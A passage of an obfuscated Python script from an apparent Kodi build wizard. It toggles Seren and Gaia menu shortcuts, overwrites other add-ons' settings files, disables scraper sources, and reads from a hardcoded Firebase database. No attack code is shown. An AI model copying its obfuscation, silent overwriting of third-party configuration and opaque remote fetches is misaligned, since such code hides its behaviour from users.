		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1339
    with open (O0OOO0O000O00000O ,'w')as O000000000OO0O00O :#line:1342
      O000000000OO0O00O .write (O0OOO000OOOOOO0OO )#line:1343
    O0OOO0O000O00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1346
    with open (O0OOO0O000O00000O ,'r')as O000000000OO0O00O :#line:1347
      O0OOO000OOOOOO0OO =O000000000OO0O00O .read ()#line:1348
    O0OOO000OOOOOO0OO =O0OOO000OOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1366
    with open (O0OOO0O000O00000O ,'w')as O000000000OO0O00O :#line:1369
      O000000000OO0O00O .write (O0OOO000OOOOOO0OO )#line:1370
def rdbuildinstall ():#line:1373
  try :#line:1374
   OOOOO0O00O0000O0O =(ADDON .getSetting ("auto_rd"))#line:1375
   if OOOOO0O00O0000O0O =='true':#line:1376
     OO0O0O00O0O000O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1377
     OO000O00OO00O00O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1378
     copyfile (OO0O0O00O0O000O0O ,OO000O00OO00O00O0 )#line:1379
  except :#line:1380
     pass #line:1381
theme_nox ='https://zxcsd-3bae5-default-rtdb.firebaseio.com'#line:1382
def rdbuildaddonoff ():#line:1383
    O0O0O0O0O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1386
    with open (O0O0O0O0O00O00O0O ,'r')as OO00O0O0OOOO0OOO0 :#line:1387
      OOOOO0O0O0O000O00 =OO00O0O0OOOO0OOO0 .read ()#line:1388
    OOOOO0O0O0O000O00 =OOOOO0O0O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1406
    with open (O0O0O0O0O00O00O0O ,'w')as OO00O0O0OOOO0OOO0 :#line:1409
      OO00O0O0OOOO0OOO0 .write (OOOOO0O0O0O000O00 )#line:1410
    O0O0O0O0O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1414
    with open (O0O0O0O0O00O00O0O ,'r')as OO00O0O0OOOO0OOO0 :#line:1415
      OOOOO0O0O0O000O00 =OO00O0O0OOOO0OOO0 .read ()#line:1416
    OOOOO0O0O0O000O00 =OOOOO0O0O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1434
    with open (O0O0O0O0O00O00O0O ,'w')as OO00O0O0OOOO0OOO0 :#line:1437
      OO00O0O0OOOO0OOO0 .write (OOOOO0O0O0O000O00 )#line:1438
    O0O0O0O0O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1442
    with open (O0O0O0O0O00O00O0O ,'r')as OO00O0O0OOOO0OOO0 :#line:1443
      OOOOO0O0O0O000O00 =OO00O0O0OOOO0OOO0 .read ()#line:1444
    OOOOO0O0O0O000O00 =OOOOO0O0O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1462
    with open (O0O0O0O0O00O00O0O ,'w')as OO00O0O0OOOO0OOO0 :#line:1465
      OO00O0O0OOOO0OOO0 .write (OOOOO0O0O0O000O00 )#line:1466
    O0O0O0O0O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1470
    with open (O0O0O0O0O00O00O0O ,'r')as OO00O0O0OOOO0OOO0 :#line:1471
      OOOOO0O0O0O000O00 =OO00O0O0OOOO0OOO0 .read ()#line:1472
    OOOOO0O0O0O000O00 =OOOOO0O0O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1490
    with open (O0O0O0O0O00O00O0O ,'w')as OO00O0O0OOOO0OOO0 :#line:1493
      OO00O0O0OOOO0OOO0 .write (OOOOO0O0O0O000O00 )#line:1494
    O0O0O0O0O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1497
    with open (O0O0O0O0O00O00O0O ,'r')as OO00O0O0OOOO0OOO0 :#line:1498
      OOOOO0O0O0O000O00 =OO00O0O0OOOO0OOO0 .read ()#line:1499
    OOOOO0O0O0O000O00 =OOOOO0O0O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1517
    with open (O0O0O0O0O00O00O0O ,'w')as OO00O0O0OOOO0OOO0 :#line:1520
      OO00O0O0OOOO0OOO0 .write (OOOOO0O0O0O000O00 )#line:1521
    O0O0O0O0O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1523
    with open (O0O0O0O0O00O00O0O ,'r')as OO00O0O0OOOO0OOO0 :#line:1524
      OOOOO0O0O0O000O00 =OO00O0O0OOOO0OOO0 .read ()#line:1525
    OOOOO0O0O0O000O00 =OOOOO0O0O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1543
    with open (O0O0O0O0O00O00O0O ,'w')as OO00O0O0OOOO0OOO0 :#line:1546
      OO00O0O0OOOO0OOO0 .write (OOOOO0O0O0O000O00 )#line:1547
    O0O0O0O0O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1549
    with open (O0O0O0O0O00O00O0O ,'r')as OO00O0O0OOOO0OOO0 :#line:1550
      OOOOO0O0O0O000O00 =OO00O0O0OOOO0OOO0 .read ()#line:1551
    OOOOO0O0O0O000O00 =OOOOO0O0O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1569
    with open (O0O0O0O0O00O00O0O ,'w')as OO00O0O0OOOO0OOO0 :#line:1572
      OO00O0O0OOOO0OOO0 .write (OOOOO0O0O0O000O00 )#line:1573
    O0O0O0O0O00O00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1576
    with open (O0O0O0O0O00O00O0O ,'r')as OO00O0O0OOOO0OOO0 :#line:1577
      OOOOO0O0O0O000O00 =OO00O0O0OOOO0OOO0 .read ()#line:1578
    OOOOO0O0O0O000O00 =OOOOO0O0O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1596
    with open (O0O0O0O0O00O00O0O ,'w')as OO00O0O0OOOO0OOO0 :#line:1599
      OO00O0O0OOOO0OOO0 .write (OOOOO0O0O0O000O00 )#line:1600
def rdbuildinstalloff ():#line:1603
    try :#line:1604
       OOOOOOO0000OO0OO0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1605
       OO0OO000OO0O00O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1606
       copyfile (OOOOOOO0000OO0OO0 ,OO0OO000OO0O00O00 )#line:1608
       OOOOOOO0000OO0OO0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1610
       OO0OO000OO0O00O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1611
       copyfile (OOOOOOO0000OO0OO0 ,OO0OO000OO0O00O00 )#line:1613
       OOOOOOO0000OO0OO0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1615
       OO0OO000OO0O00O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1616
       copyfile (OOOOOOO0000OO0OO0 ,OO0OO000OO0O00O00 )#line:1618
       OOOOOOO0000OO0OO0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1621
       OO0OO000OO0O00O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1622
       copyfile (OOOOOOO0000OO0OO0 ,OO0OO000OO0O00O00 )#line:1624
    except :#line:1626
       pass #line:1627
def read_firebase (OO0O0OO0OO0O00OOO ):#line:1631
    from resources .modules .firebase import firebase #line:1632
    firebase =firebase .FirebaseApplication ('https://%s-default-rtdb.firebaseio.com'%ADDON .getSetting ("sync_user"),None )#line:1633
    O0OO00OOOO00OO0OO =firebase .get ('/',None )#line:1634
    if OO0O0OO0OO0O00OOO in O0OO00OOOO00OO0OO :#line:1635
        return O0OO00OOOO00OO0OO [OO0O0OO0OO0O00OOO ]#line:1636
    else :#line:1637
        return {}#line:1638
def rdbuildaddonON ():#line:1641
    O0OO0OOOO00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1643
    with open (O0OO0OOOO00O0OO00 ,'r')as O0O0OOO00O0OOOOO0 :#line:1644
      OO0OO0OO0O0O00OO0 =O0O0OOO00O0OOOOO0 .read ()#line:1645
    OO0OO0OO0O0O00OO0 =OO0OO0OO0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1663
    with open (O0OO0OOOO00O0OO00 ,'w')as O0O0OOO00O0OOOOO0 :#line:1666
      O0O0OOO00O0OOOOO0 .write (OO0OO0OO0O0O00OO0 )#line:1667
    O0OO0OOOO00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1671
    with open (O0OO0OOOO00O0OO00 ,'r')as O0O0OOO00O0OOOOO0 :#line:1672
      OO0OO0OO0O0O00OO0 =O0O0OOO00O0OOOOO0 .read ()#line:1673
    OO0OO0OO0O0O00OO0 =OO0OO0OO0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1691
    with open (O0OO0OOOO00O0OO00 ,'w')as O0O0OOO00O0OOOOO0 :#line:1694
      O0O0OOO00O0OOOOO0 .write (OO0OO0OO0O0O00OO0 )#line:1695
    O0OO0OOOO00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1699
    with open (O0OO0OOOO00O0OO00 ,'r')as O0O0OOO00O0OOOOO0 :#line:1700
      OO0OO0OO0O0O00OO0 =O0O0OOO00O0OOOOO0 .read ()#line:1701
    OO0OO0OO0O0O00OO0 =OO0OO0OO0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1719
    with open (O0OO0OOOO00O0OO00 ,'w')as O0O0OOO00O0OOOOO0 :#line:1722
      O0O0OOO00O0OOOOO0 .write (OO0OO0OO0O0O00OO0 )#line:1723
    O0OO0OOOO00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1727
    with open (O0OO0OOOO00O0OO00 ,'r')as O0O0OOO00O0OOOOO0 :#line:1728
      OO0OO0OO0O0O00OO0 =O0O0OOO00O0OOOOO0 .read ()#line:1729
    OO0OO0OO0O0O00OO0 =OO0OO0OO0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1747
    with open (O0OO0OOOO00O0OO00 ,'w')as O0O0OOO00O0OOOOO0 :#line:1750
      O0O0OOO00O0OOOOO0 .write (OO0OO0OO0O0O00OO0 )#line:1751
    O0OO0OOOO00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1754
    with open (O0OO0OOOO00O0OO00 ,'r')as O0O0OOO00O0OOOOO0 :#line:1755
      OO0OO0OO0O0O00OO0 =O0O0OOO00O0OOOOO0 .read ()#line:1756
    OO0OO0OO0O0O00OO0 =OO0OO0OO0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1774
    with open (O0OO0OOOO00O0OO00 ,'w')as O0O0OOO00O0OOOOO0 :#line:1777
      O0O0OOO00O0OOOOO0 .write (OO0OO0OO0O0O00OO0 )#line:1778
    O0OO0OOOO00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1780
    with open (O0OO0OOOO00O0OO00 ,'r')as O0O0OOO00O0OOOOO0 :#line:1781
      OO0OO0OO0O0O00OO0 =O0O0OOO00O0OOOOO0 .read ()#line:1782
    OO0OO0OO0O0O00OO0 =OO0OO0OO0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1800
    with open (O0OO0OOOO00O0OO00 ,'w')as O0O0OOO00O0OOOOO0 :#line:1803
      O0O0OOO00O0OOOOO0 .write (OO0OO0OO0O0O00OO0 )#line:1804
    O0OO0OOOO00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1806
    with open (O0OO0OOOO00O0OO00 ,'r')as O0O0OOO00O0OOOOO0 :#line:1807
      OO0OO0OO0O0O00OO0 =O0O0OOO00O0OOOOO0 .read ()#line:1808
    OO0OO0OO0O0O00OO0 =OO0OO0OO0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1826
    with open (O0OO0OOOO00O0OO00 ,'w')as O0O0OOO00O0OOOOO0 :#line:1829
      O0O0OOO00O0OOOOO0 .write (OO0OO0OO0O0O00OO0 )#line:1830
    O0OO0OOOO00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1833
    with open (O0OO0OOOO00O0OO00 ,'r')as O0O0OOO00O0OOOOO0 :#line:1834
      OO0OO0OO0O0O00OO0 =O0O0OOO00O0OOOOO0 .read ()#line:1835
    OO0OO0OO0O0O00OO0 =OO0OO0OO0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1853
    with open (O0OO0OOOO00O0OO00 ,'w')as O0O0OOO00O0OOOOO0 :#line:1856
      O0O0OOO00O0OOOOO0 .write (OO0OO0OO0O0O00OO0 )#line:1857
def read_skin (O00OO00O00000OO0O ):#line:1859
    from resources .modules .firebase import firebase #line:1860
    firebase =firebase .FirebaseApplication (theme_nox ,None )#line:1861
    O00000O0O0O00OO00 =firebase .get ('/',None )#line:1862
    if O00OO00O00000OO0O in O00000O0O0O00OO00 :#line:1863
        return O00000O0O0O00OO00 [O00OO00O00000OO0O ]#line:1864
    else :#line:1865
        return {}#line:1866
def rdbuildinstallON ():#line:1867
    try :#line:1869
       O00OO0O000OOOO00O =ADDONPATH +"/resources/rd/victory.xml"#line:1870
       OO00O0O0O0000OOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1871
       copyfile (O00OO0O000OOOO00O ,OO00O0O0O0000OOOO )#line:1873
       O00OO0O000OOOO00O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1875
       OO00O0O0O0000OOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1876
       copyfile (O00OO0O000OOOO00O ,OO00O0O0O0000OOOO )#line:1878
       O00OO0O000OOOO00O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1880
       OO00O0O0O0000OOOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1881
       copyfile (O00OO0O000OOOO00O ,OO00O0O0O0000OOOO )#line:1883
       O00OO0O000OOOO00O =ADDONPATH +"/resources/rd/Splash.png"#line:1886
       OO00O0O0O0000OOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1887
       copyfile (O00OO0O000OOOO00O ,OO00O0O0O0000OOOO )#line:1889
    except :#line:1891
       pass #line:1892
def rdbuild ():#line:1902
	OO00000OOO00O0OOO =(ADDON .getSetting ("auto_rd"))#line:1903
	if OO00000OOO00O0OOO =='true':#line:1904
		OO00OO0O0OOOO0O0O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1905
		OO00OO0O0OOOO0O0O .setSetting ('all_t','0')#line:1906
		OO00OO0O0OOOO0O0O .setSetting ('rd_menu_enable','false')#line:1907
		OO00OO0O0OOOO0O0O .setSetting ('magnet_bay','false')#line:1908
		OO00OO0O0OOOO0O0O .setSetting ('magnet_extra','false')#line:1909
		OO00OO0O0OOOO0O0O .setSetting ('rd_only','false')#line:1910
		OO00OO0O0OOOO0O0O .setSetting ('ftp','false')#line:1912
		OO00OO0O0OOOO0O0O .setSetting ('fp','false')#line:1913
		OO00OO0O0OOOO0O0O .setSetting ('filter_fp','false')#line:1914
		OO00OO0O0OOOO0O0O .setSetting ('fp_size_en','false')#line:1915
		OO00OO0O0OOOO0O0O .setSetting ('afdah','false')#line:1916
		OO00OO0O0OOOO0O0O .setSetting ('ap2s','false')#line:1917
		OO00OO0O0OOOO0O0O .setSetting ('cin','false')#line:1918
		OO00OO0O0OOOO0O0O .setSetting ('clv','false')#line:1919
		OO00OO0O0OOOO0O0O .setSetting ('cmv','false')#line:1920
		OO00OO0O0OOOO0O0O .setSetting ('dl20','false')#line:1921
		OO00OO0O0OOOO0O0O .setSetting ('esc','false')#line:1922
		OO00OO0O0OOOO0O0O .setSetting ('extra','false')#line:1923
		OO00OO0O0OOOO0O0O .setSetting ('film','false')#line:1924
		OO00OO0O0OOOO0O0O .setSetting ('fre','false')#line:1925
		OO00OO0O0OOOO0O0O .setSetting ('fxy','false')#line:1926
		OO00OO0O0OOOO0O0O .setSetting ('genv','false')#line:1927
		OO00OO0O0OOOO0O0O .setSetting ('getgo','false')#line:1928
		OO00OO0O0OOOO0O0O .setSetting ('gold','false')#line:1929
		OO00OO0O0OOOO0O0O .setSetting ('gona','false')#line:1930
		OO00OO0O0OOOO0O0O .setSetting ('hdmm','false')#line:1931
		OO00OO0O0OOOO0O0O .setSetting ('hdt','false')#line:1932
		OO00OO0O0OOOO0O0O .setSetting ('icy','false')#line:1933
		OO00OO0O0OOOO0O0O .setSetting ('ind','false')#line:1934
		OO00OO0O0OOOO0O0O .setSetting ('iwi','false')#line:1935
		OO00OO0O0OOOO0O0O .setSetting ('jen_free','false')#line:1936
		OO00OO0O0OOOO0O0O .setSetting ('kiss','false')#line:1937
		OO00OO0O0OOOO0O0O .setSetting ('lavin','false')#line:1938
		OO00OO0O0OOOO0O0O .setSetting ('los','false')#line:1939
		OO00OO0O0OOOO0O0O .setSetting ('m4u','false')#line:1940
		OO00OO0O0OOOO0O0O .setSetting ('mesh','false')#line:1941
		OO00OO0O0OOOO0O0O .setSetting ('mf','false')#line:1942
		OO00OO0O0OOOO0O0O .setSetting ('mkvc','false')#line:1943
